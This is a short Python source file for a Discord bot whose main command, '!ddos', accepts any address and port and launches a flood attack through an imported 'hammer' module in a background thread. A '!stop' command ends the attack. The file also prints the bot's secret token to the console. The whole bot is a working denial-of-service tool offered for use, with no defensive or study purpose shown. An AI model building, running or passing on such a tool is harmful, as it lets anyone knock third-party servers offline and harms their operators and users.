import discord
from discord.ext import commands
import hammer
import sys
import threading
import subprocess
import os
from keep_alive import keep_alive
import time

bot = commands.Bot(command_prefix='!')


@bot.command()
async def ping(ctx):
  await ctx.send('pong')

@bot.command()
async def ddos(ctx,arg,port):
    if not arg:
        ctx.send("no addres!")
        return
    if not port:
        ctx.send("no port!")
        return
    hammer.host = arg
    hammer.port = port
    await ctx.send("Attacking " + arg + " successfully.")
    ddos = threading.Thread(target=hammer.start)
    ddos.setDaemon(True)
    ddos.start()


@bot.command()
async def stop(ctx):
    await ctx.send("stopped the attack.")
    hammer.flag = False

keep_alive()
token = os.getenv("token")
print(token)
bot.run(token)